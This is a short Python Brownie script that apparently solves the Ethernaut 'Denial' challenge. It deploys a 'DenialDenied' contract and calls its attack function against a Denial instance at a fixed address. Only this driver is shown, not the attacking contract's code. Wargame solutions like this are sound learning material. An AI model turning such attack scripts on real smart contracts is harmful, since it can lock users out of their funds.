from brownie import config, accounts, Denial, DenialDenied, web3
InstanceAddress = "0xf4699055eeD6705D87959271d35F43498DcAdB2e"
player = accounts.add(config["wallets"]["from_key"]) 
deniel = Denial.at(InstanceAddress)
def main():
    denialDenied = DenialDenied.deploy({"from":player})
    denialDenied.attack(InstanceAddress, {"from": player})